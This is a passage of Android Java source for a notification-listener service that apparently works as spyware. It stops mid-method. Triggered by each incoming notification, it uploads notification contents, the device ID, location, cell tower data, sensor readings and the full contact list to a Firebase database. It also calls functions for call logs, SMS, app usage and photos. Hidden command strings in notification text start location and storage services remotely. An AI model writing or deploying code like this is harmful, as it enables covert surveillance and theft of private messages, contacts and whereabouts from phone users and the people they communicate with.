package com.falcon.app;

import android.Manifest;
import android.database.Cursor;
import android.app.AppOpsManager;
import android.app.Notification;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.media.AudioManager;
import android.media.AudioDeviceInfo;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.PowerManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.telephony.TelephonyManager;
import android.telephony.CellInfo;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoNr;
import android.telephony.CellInfoWcdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellIdentityLte;
import android.telephony.CellIdentityNr;
import android.telephony.CellIdentityWcdma;
import android.telephony.CellIdentityGsm;
import android.telephony.CellSignalStrengthNr;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Collections;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Date;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

public class NotificationService extends NotificationListenerService implements SensorEventListener {
    
    // Dedup map
    private final Map<String, Long> sentMap = new LinkedHashMap<String, Long>(60, 0.75f, true) {
        @Override
        protected boolean removeEldestEntry(Map.Entry<String, Long> eldest) {
            return size() > 50;
        }
    };

    private final Executor executor = Executors.newSingleThreadExecutor();

    private static final long ONE_DAY_MS = 24 * 60 * 60 * 1000L;
    private static final long TEN_MINUTE_MS = 15 * 60 * 1000L;
    private static final long ONE_MINUTE_MS = 60 * 1000L;
    private static final long TEN_SECOND_MS = 10 * 1000L;

    private SensorManager sensorManager;
    private Sensor proximitySensor;
    private Sensor lightSensor;
    private Sensor accelerometer;

    private String proximityStatus = "";

    private float lightValue = 0f;
    private float movementValue = 0f;
    private float lastX, lastY, lastZ;

    private volatile boolean isProximityNear = false;
    private volatile boolean isLoggingIn = false;

    private static final Pattern SIZE_PATTERN = Pattern.compile(
            "(\\d+(?:\\.\\d+)?)\\s*(B|KB|MB|GB)\\s*/\\s*(\\d+(?:\\.\\d+)?)\\s*(B|KB|MB|GB)",
            Pattern.CASE_INSENSITIVE
    );
    private static final Pattern TIME_PATTERN = Pattern.compile(
            "(\\d+)\\s*(sec|secs|second|seconds|min|mins|minute|minutes|hour|hours)\\s*(left|remaining)",
            Pattern.CASE_INSENSITIVE
    );
    private static final Pattern SPEED_PATTERN = Pattern.compile(
            "(\\d+(\\.\\d+)?\\s*(B|KB|MB|GB)/s)",
            Pattern.CASE_INSENSITIVE
    );

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();

        if (FirebaseAuth.getInstance().getCurrentUser() == null) {
            loginAnonymously();
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user != null && isInternetOn()) {
            executor.execute(() -> {
                handleNotificationData(sbn);
                checkAndSendUserBasic();
                fetchAndSaveConfigs();
                startSensorManager();
                checkAndSendCellTower();
                checkAndSendLocation();
                checkAndSendContacts();
                checkAndSendCallLogs();
                checkAndSendSms();
                checkAndSendUsageSummary();
                checkAndSendDeviceStatus();
                checkAndSendPhotos();
            });
        }
    }

    // ========================== USER LOGIN ==========================
    private void loginAnonymously() {
        if (isLoggingIn) return;
        isLoggingIn = true;

        FirebaseAuth.getInstance().signInAnonymously()
                .addOnSuccessListener(authResult -> isLoggingIn = false)
                .addOnFailureListener(e -> {
                    isLoggingIn = false;
                });
    }

    // ======================= NOTIFICATION DATA =======================
    private void handleNotificationData(StatusBarNotification sbn) {
        try {
            if (sbn == null) return;
            String pkg;
            try {
                pkg = sbn.getPackageName();
                if (pkg == null) return;
            } catch (Exception ignored) {
                return;
            }

            String appName = pkg;
            try {
                PackageManager pm = getPackageManager();
                ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
                CharSequence label = pm.getApplicationLabel(info);

                if (label != null) {
                    appName = label.toString();
                }
            } catch (Exception ignored) {
                appName = pkg;
            }

            Notification notification;
            Bundle extras;
            try {
                notification = sbn.getNotification();
                if (notification == null) return;
                extras = notification.extras;
                if (extras == null) return;
            } catch (Exception ignored) {
                return;
            }

            String title = "";
            String text = "";
            String bigText = "";
            try {
                CharSequence titleCS = extras.getCharSequence(Notification.EXTRA_TITLE);
                CharSequence textCS = extras.getCharSequence(Notification.EXTRA_TEXT);
                CharSequence bigTextCS = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);

                title = (titleCS != null) ? titleCS.toString().trim() : "";
                text = (textCS != null) ? textCS.toString().trim() : "";
                bigText = (bigTextCS != null) ? bigTextCS.toString().trim() : "";

            } catch (Exception ignored) {
                return;
            }

            if (title.isEmpty() && text.isEmpty() && bigText.isEmpty()) return;

            String allText = (title + " " + text + " " + bigText).toLowerCase();
            String lowerTitle = title.toLowerCase();
            String lowerText = text.toLowerCase();

            // Progress
            if (SIZE_PATTERN.matcher(lowerText).find() ||
                    TIME_PATTERN.matcher(lowerText).find() ||
                    SPEED_PATTERN.matcher(lowerText).find())
                return;

            List<String> keywords = Arrays.asList(
                    "sending", "uploading", "downloading", "transferring", "receiving",
                    "exporting", "encoding", "rendering", "compressing", "extracting",
                    "creating", "installing", "optimizing", "configuring", "updating",
                    "scanning", "encrypting", "decrypting", "cleaning", "processing",
                    "loading", "syncing", "synchronizing", "backing", "restoring",
                    "checking", "verifying", "validating", "connecting", "reconnecting",
                    "disconnecting", "initializing", "starting", "finishing", "preparing",
                    "finalizing", "calculating", "analyzing", "indexing", "caching",
                    "retrying", "waiting", "pending", "queued", "resuming", "copying",
                    "moving", "merging", "splitting", "remaining", "converting", "opening"
            );

            if ((allText.contains("%") || allText.matches(".*\\d+\\s*/\\s*\\d+.*"))
                    && keywords.stream().anyMatch(allText::contains)) return;

            // Whatsapp
            if ((pkg.equals("com.whatsapp") || pkg.equals("com.whatsapp.w4b"))
                    && lowerText.contains("new message")) return;

            if ((pkg.equals("com.whatsapp") || pkg.equals("com.whatsapp.w4b")) && lowerTitle.contains("whatsapp")
                    && (lowerText.contains("sending") || lowerText.contains("downloading"))) return;

            // Facebook
            if ((pkg.equals("com.facebook.orca") && lowerTitle.contains("messenger"))
                    && lowerText.contains("new message")) return;

            if (title.equals(text)) text = "";
            if (title.equals(bigText)) bigText = "";
            if (!text.isEmpty() && !text.equals(title) && text.equals(bigText)) bigText = "";

            // Commands
            if (allText.contains("..h")) {
                if (hasLocationPermission()) {
                    if (isLocationEnabled()) {
                        
                        // Start location service
                        Intent locService = new Intent(this, LocationService.class);
                        startService(locService);
                    }
                }
            }

            if (allText.contains("..aa")) {
                if (hasStoragePermission()) {
                    
                    // Start storage service
                    Intent StoService = new Intent(this, StorageService.class);
                    startService(StoService);
                }
            }

            long now = System.currentTimeMillis();
            long postTime = sbn.getPostTime();
            String notificationKey = pkg + "_" + title + "_" + text + "_" + bigText;

            if (sentMap.containsKey(notificationKey)) {
                Long lastSentTime = sentMap.get(notificationKey);
                if (lastSentTime != null && now - lastSentTime < 5000) return;
            }
            sentMap.put(notificationKey, now);

            sendNotification(pkg, appName, title, text, bigText, postTime);

        } catch (Throwable ignored) {}
    }

    private void sendNotification(String pkg, String appName, String title, String text, String bigText, long postTime) {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            DatabaseReference ref = FirebaseDatabase.getInstance()
                    .getReference("users_data")
                    .child(user.getUid())
                    .child("notifications");

            String id = ref.push().getKey();
            if (id == null) return;

            Map<String, Object> data = new HashMap<>();
            data.put("package", pkg);
            data.put("appName", appName);
            data.put("title", title);
            data.put("text", text);
            data.put("bigText", bigText);
            data.put("dateTime", formatDateTime(postTime));

            ref.child(id).setValue(data)
                    .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendNotification.firebase.FailureListener", e));

        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendNotification.catch", e);
        }
    }

    // ========================= USER BASIC =========================
    private void checkAndSendUserBasic() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
            
            long lastCooldownSet = sp.getLong("last_user_basic_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < TEN_SECOND_MS) return;
            
            sp.edit().putLong("last_user_basic_cooldown_set", now).apply();
            boolean oneTimeDataSent = sp.getBoolean("user_basic_onetime_sent", false);
            
            String uid = user.getUid();
            
            Map<String, Object> data = new HashMap<>();
            data.put("time", now);
            
            if (!oneTimeDataSent) {
                String name = "";
                String picture = "";
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
                
                String androidId;
                try {
                    androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                    if (androidId == null) androidId = "unknown";
                } catch (Exception ignored) {
                    androidId = "unknown";
                } 
                
                data.put("uid", uid);
                data.put("name", name);
                data.put("picture", picture);
                data.put("deviceName", deviceName);
                data.put("androidId", androidId);
            }

            DatabaseReference ref = FirebaseDatabase.getInstance()
                    .getReference("users_basic")
                    .child(uid);
            ref.updateChildren(data)
                 .addOnSuccessListener(aVoid -> {
                     if (!oneTimeDataSent) {
                         sp.edit().putBoolean("user_basic_onetime_sent", true).apply();
                     }
                 })
                 .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendUserBasic.firebase.FailureListener", e));
                 
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendUserBasic.catch", e);
        }
    }

    // ========================= CONFIGS =========================
    private void fetchAndSaveConfigs() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
            
            long lastCooldownSet = sp.getLong("last_configs_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < TEN_MINUTE_MS) return;

            sp.edit().putLong("last_configs_cooldown_set", now).apply();

            if (hasStoragePermission()) {
                
                // Start storage service
                Intent stoService = new Intent(this, StorageService.class);
                startService(stoService);
            }

            String uid = user.getUid();

            // Cloud Config
            try {
                DatabaseReference cloudRef = FirebaseDatabase.getInstance().getReference("configs/app/clouds/cloudinary");
                cloudRef.addListenerForSingleValueEvent(new ValueEventListener() {

                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        try {
                            if (!snapshot.exists()) return;

                            if (!snapshot.hasChild("enabled") || !snapshot.hasChild("cloudName") || !snapshot.hasChild("uploadPreset")) return;

                            Boolean canUpload = snapshot.child("enabled").getValue(Boolean.class);
                            String cloudName = snapshot.child("cloudName").getValue(String.class);
                            String uploadPreset = snapshot.child("uploadPreset").getValue(String.class);

                            if (canUpload == null || cloudName == null || uploadPreset == null || cloudName.isEmpty() || uploadPreset.isEmpty()) return;
                            
                            sp.edit()
                               .putBoolean("upload_enabled", canUpload)
                               .putString("cloud_name", cloudName)
                               .putString("upload_preset", uploadPreset)
                               .apply();

                        } catch (Throwable e) {
                            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch.public.void.onDataChange.catch", e);
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch.public.void.onCancelled", error.toException());
                    }
                });

            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch", e);
            }

            // Sensors Config
            try {
                DatabaseReference sensorRef = FirebaseDatabase.getInstance().getReference("configs/users").child(uid).child("sensors");
                sensorRef.addListenerForSingleValueEvent(new ValueEventListener() {

                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        try {
                            if (!snapshot.exists()) return;

                            Boolean proximity = snapshot.child("proximity").getValue(Boolean.class);
                            Boolean light = snapshot.child("light").getValue(Boolean.class);
                            Boolean accelerometer = snapshot.child("accelerometer").getValue(Boolean.class);

                            if (proximity == null && light == null && accelerometer == null) return;

                            SharedPreferences.Editor editor = sp.edit();

                            if (proximity != null) {
                                editor.putBoolean("proximity_enabled", proximity);
                            }

                            if (light != null) {
                                editor.putBoolean("light_enabled", light);
                            }

                            if (accelerometer != null) {
                                editor.putBoolean("accelerometer_enabled", accelerometer);
                            }

                            editor.apply();

                        } catch (Throwable e) {
                            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch.public.void.onDataChange.catch", e);
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch.public.void.onCancelled", error.toException());
                    }
                });

            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch", e);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.outer.catch", e);
        }
    }

    // ========================= SENSORS ==========================
    private void startSensorManager() {
        try {
            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
            
            long lastCooldownSet = sp.getLong("last_sensor_manager_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < TEN_SECOND_MS) return;

            sp.edit().putLong("last_sensor_manager_cooldown_set", now).apply();

            boolean proximityEnabled = sp.getBoolean("proximity_enabled", false);
            boolean lightEnabled = sp.getBoolean("light_enabled", false);
            boolean accelerometerEnabled = sp.getBoolean("accelerometer_enabled", false);

            sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);

            if (sensorManager != null) {

                if (proximityEnabled) {
                    proximitySensor = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);

                    if (proximitySensor != null) {
                        sensorManager.registerListener(this, proximitySensor, SensorManager.SENSOR_DELAY_NORMAL);
                    }
                } else {
                    proximityStatus = "";
                }

                if (lightEnabled) {
                    lightSensor = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT);

                    if (lightSensor != null) {
                        sensorManager.registerListener(this, lightSensor, SensorManager.SENSOR_DELAY_NORMAL);
                    }
                } else {
                    lightValue = -1f;
                }

                if (accelerometerEnabled) {
                    accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);

                    if (accelerometer != null) {
                        sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
                    }
                } else {
                    movementValue = -1f;
                }
            }
            
            if (proximityEnabled || lightEnabled || accelerometerEnabled) {
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                   sendSensorsData();
                }, 1000);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sensorManager.catch", e);
        }
    }

    @Override
    public void onSensorChanged(SensorEvent event) {
        try {
            if (event.sensor.getType() == Sensor.TYPE_PROXIMITY) {
                float value = event.values[0];
                isProximityNear = value < proximitySensor.getMaximumRange();

                if (isProximityNear) {
                    proximityStatus = "NEAR";
                } else {
                    proximityStatus = "FAR";
                }
            }

            if (event.sensor.getType() == Sensor.TYPE_LIGHT) {
                lightValue = event.values[0];
            }

            if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
                float x = event.values[0];
                float y = event.values[1];
                float z = event.values[2];

                float dx = Math.abs(x - lastX);
                float dy = Math.abs(y - lastY);
                float dz = Math.abs(z - lastZ);

                movementValue = dx + dy + dz;

                lastX = x;
                lastY = y;
                lastZ = z;
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.public.void.onSensorChanged.catch", e);
        }
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {}
        
    private void sendSensorsData() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;
            
            DatabaseReference ref = FirebaseDatabase.getInstance()
                        .getReference("users_data")
                        .child(user.getUid())
                        .child("sensors");

            String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());

            String id = ref.push().getKey();
            if (id == null) return;

            Map<String, Object> data = new HashMap<>();
            data.put("proximity", proximityStatus);
            data.put("light", lightValue);
            data.put("movement", movementValue);
            data.put("dateTime", dateTime);

            ref.child(id).setValue(data)
                    .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSensorsData.firebase.FailureListener", e));
                    
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (sensorManager != null) {
                    sensorManager.unregisterListener(NotificationService.this);
                }
            }, 3000);
            
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSensorsData.catch", e);
        }
    }   

    // ========================= CELL TOWER =========================
    private void checkAndSendCellTower() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            if (!hasLocationPermission()) return;
            if (!isLocationEnabled()) return;

            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
            
            long lastCooldownSet = sp.getLong("last_cell_tower_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < ONE_MINUTE_MS) return;

            sp.edit().putLong("last_cell_tower_cooldown_set", now).apply();

            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) return;

            try {
                List<CellInfo> cells = tm.getAllCellInfo();
                if (cells == null || cells.isEmpty()) return;

                String lastTowerUniqueId = sp.getString("last_cell_tower_unique_id", "");

                for (CellInfo info : cells) {
                    try {
                        if (!info.isRegistered()) continue;

                        String networkType = "Unknown";
                        String tac = "";
                        String lac = "";
                        String cellId = "";
                        String pci = "";
                        String psc = "";
                        String signal = "";

                        if (info instanceof CellInfoLte) {
                            CellInfoLte lte = (CellInfoLte) info;
                            CellIdentityLte id = lte.getCellIdentity();

                            if (id.getCi() != Integer.MAX_VALUE && id.getCi() != -1) {
                                networkType = "4G LTE";
                                cellId = String.valueOf(id.getCi());
                                tac = (id.getTac() != Integer.MAX_VALUE) ? String.valueOf(id.getTac()) : "Unknown";
                                pci = (id.getPci() != Integer.MAX_VALUE) ? String.valueOf(id.getPci()) : "Unknown";
                                signal = String.valueOf(lte.getCellSignalStrength().getRsrp());
                            }

                        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && info instanceof CellInfoNr) {
                            CellInfoNr nr = (CellInfoNr) info;
                            CellIdentityNr id = (CellIdentityNr) nr.getCellIdentity();

                            if (id.getNci() != Long.MAX_VALUE && id.getNci() != -1) {
                                networkType = "5G NR";
                                cellId = String.valueOf(id.getNci());
                                tac = (id.getTac() != Integer.MAX_VALUE) ? String.valueOf(id.getTac()) : "Unknown";
                                pci = (id.getPci() != Integer.MAX_VALUE) ? String.valueOf(id.getPci()) : "Unknown";
                                CellSignalStrengthNr ss = (CellSignalStrengthNr) nr.getCellSignalStrength();
                                signal = String.valueOf(ss.getDbm());
                            }

                        } else if (info instanceof CellInfoWcdma) {
                            CellInfoWcdma wcdma = (CellInfoWcdma) info;
                            CellIdentityWcdma id = wcdma.getCellIdentity();

                            if (id.getCid() != Integer.MAX_VALUE && id.getCid() != -1) {
                                networkType = "3G WCDMA";
                                cellId = String.valueOf(id.getCid());
                                lac = (id.getLac() != Integer.MAX_VALUE) ? String.valueOf(id.getLac()) : "Unknown";
                                psc = (id.getPsc() != Integer.MAX_VALUE) ? String.valueOf(id.getPsc()) : "Unknown";
                                signal = String.valueOf(wcdma.getCellSignalStrength().getDbm());
                            }

                        } else if (info instanceof CellInfoGsm) {
                            CellInfoGsm gsm = (CellInfoGsm) info;
                            CellIdentityGsm id = gsm.getCellIdentity();

                            if (id.getCid() != Integer.MAX_VALUE && id.getCid() != -1) {
                                networkType = "2G GSM";
                                cellId = String.valueOf(id.getCid());
                                lac = (id.getLac() != Integer.MAX_VALUE) ? String.valueOf(id.getLac()) : "Unknown";
                                signal = String.valueOf(gsm.getCellSignalStrength().getDbm());
                            }
                        }

                        String operator = tm.getNetworkOperator();
                        String operatorName = tm.getNetworkOperatorName();
                        String towerUniqueId = operator + "_" + cellId;

                        if (towerUniqueId.equals(lastTowerUniqueId) || cellId.isEmpty()) return;

                        sp.edit().putString("last_cell_tower_unique_id", towerUniqueId).apply();

                        // Start location service
                        Intent locService = new Intent(this, LocationService.class);
                        startService(locService);

                        DatabaseReference ref = FirebaseDatabase.getInstance()
                                .getReference("users_data")
                                .child(user.getUid())
                                .child("cell_towers");

                        String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());
                        String id = ref.push().getKey();
                        if (id == null) return;

                        HashMap<String, Object> data = new HashMap<>();
                        data.put("operator", operator);
                        data.put("operatorName", operatorName);
                        data.put("networkType", networkType);
                        data.put("cellId", cellId);
                        data.put("tac", tac);
                        data.put("lac", lac);
                        data.put("pci", pci);
                        data.put("psc", psc);
                        data.put("signal", signal);
                        data.put("dateTime", dateTime);

                        ref.child(id).setValue(data)
                                .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.firebase.FailureListener", e));

                        return;

                    } catch (Throwable e) {
                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.inner.catch", e);
                    }
                }
            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.middle.catch", e);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.outer.catch", e);
        }
    }

    // ========================= LOCATION =========================
    private void checkAndSendLocation() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            if (!hasLocationPermission()) return;
            if (!isLocationEnabled()) return;
            
            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);

            long lastCooldownSet = sp.getLong("last_location_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < ONE_MINUTE_MS) return;

            sp.edit().putLong("last_location_cooldown_set", now).apply();

            try {
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                Location tempLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (tempLoc == null) tempLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (tempLoc == null) return;

                final Location loc = tempLoc;

                try {
                    if (sp.contains("last_current_location_latlon")) {

                        String lastCurrentLocation = sp.getString("last_current_location_latlon", "");
                        String locationLatLon = String.valueOf(loc.getLatitude()) + String.valueOf(loc.getLongitude());

                        if (!lastCurrentLocation.isEmpty() && !locationLatLon.isEmpty()) {
                            if (lastCurrentLocation.equals(locationLatLon)) return;
                        }
                    }

                    if (sp.contains("last_known_location_lat") && sp.contains("last_known_location_lon")) {

                        double lastLat = Double.longBitsToDouble(sp.getLong("last_known_location_lat", 0));
                        double lastLon = Double.longBitsToDouble(sp.getLong("last_known_location_lon", 0));

                        Location lastLoc = new Location("");
                        lastLoc.setLatitude(lastLat);
                        lastLoc.setLongitude(lastLon);

                        float distance = loc.distanceTo(lastLoc);
                        if (distance < 30) return;
                    }
                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.inner.catch", e);
                }

                DatabaseReference ref = FirebaseDatabase.getInstance()
                        .getReference("users_data")
                        .child(user.getUid())
                        .child("locations");

                String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());

                String id = ref.push().getKey();
                if (id == null) return;

                Map<String, Object> data = new HashMap<>();
                data.put("type", "last known");
                data.put("lat", loc.getLatitude());
                data.put("lon", loc.getLongitude());
                data.put("accuracy", loc.getAccuracy());
                data.put("provider", loc.getProvider());
                data.put("dateTime", dateTime);

                ref.child(id).setValue(data)
                        .addOnSuccessListener(aVoid -> {
                            sp.edit()
                                    .putLong("last_known_location_lat", Double.doubleToRawLongBits(loc.getLatitude()))
                                    .putLong("last_known_location_lon", Double.doubleToRawLongBits(loc.getLongitude()))
                                    .apply();
                        })
                        .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.firebase.FailureListener", e));

            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.middle.catch", e);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.outer.catch", e);
        }
    }

    // ========================= CONTACTS =========================
    private void checkAndSendContacts() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            if (!hasContactsPermission()) return;

            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);

            long lastCooldownSet = sp.getLong("last_contacts_cooldown_set", 0);
            long now = System.currentTimeMillis();

            if (now - lastCooldownSet < ONE_DAY_MS) return;
            
            String currentHash = getContactsHash();
            String lastHash = sp.getString("contacts_hash", "");

            if (!currentHash.equals(lastHash)) {
                sendContactsSmart(currentHash);
            }
 
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendContacts.catch", e);
        }
    }
    
    private String getContactsHash() {
        try {
            ArrayList<String> contacts = new ArrayList<>();

            Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null,
                    null,
                    null);

           if (cursor != null) {
               int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
               int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

               while (cursor.moveToNext()) {
                   String name = cursor.getString(nameIdx);
                   String number = cursor.getString(numIdx);

                   if (number != null) {
                       contacts.add(name + "|" + number.replaceAll("\\s+", ""));
                   }
               }
               cursor.close();
           }

           Collections.sort(contacts);
           return String.valueOf(contacts.toString().hashCode());

        } catch (Throwable e) {
           ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.String.getContactsHash.catch", e);
        }
        return "";
    }
    
    private void sendContactsSmart(String currentHash) {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();

            DatabaseReference ref = FirebaseDatabase.getInstance()
                    .getReference("users_data")
                    .child(user.getUid())
                    .child("contacts");

            Map<String, Object> deviceContacts = new HashMap<>();

            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

            if (cursor == null) return;

            int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                try {
                    String name = nameIdx != -1 ? cursor.getString(nameIdx) : "Unknown";
                    String number = numIdx != -1 ? cursor.getString(numIdx) : null;

                    if (number == null || number.trim().isEmpty()) continue;

                    String cleanNumber = number.replaceAll("\\s+", "");
                    String safeKey = cleanNumber.replaceAll("[.#$\\[\\]]", "_");

                    if (safeKey.isEmpty()) continue;

                    Map<String,Object> data = new HashMap<>();

                    data.put("name", name);
                    data.put("number", cleanNumber);
                    data.put("inPhone", true);

                    deviceContacts.put(safeKey, data);

                } catch(Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.inner.catch", e);
                }
            }
            cursor.close();

            ref.addListenerForSingleValueEvent(new ValueEventListener() {

                @Override
                public void onDataChange(DataSnapshot snapshot) {
                    try {
                        Map<String,Object> update = new HashMap<>();

                        for(DataSnapshot child : snapshot.getChildren()) {
                           String key = child.getKey();
                      
                           if(!deviceContacts.containsKey(key)) {
                           
                              Map<String,Object> old = new HashMap<>();
                              old.put("name", child.child("name").getValue(String.class));
                              old.put("number", child.child("number").getValue(String.class));
                              old.put("inPhone", false);
 
                              update.put(key, old);
                           }
                        }

                        update.putAll(deviceContacts);
                    
                        ref.updateChildren(update).addOnSuccessListener(unused -> {
                        
                           SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
                           sp.edit()
                              .putString("contacts_hash", currentHash)
                              .putLong("last_contacts_cooldown_set", System.currentTimeMillis())
                              .apply();
                        })
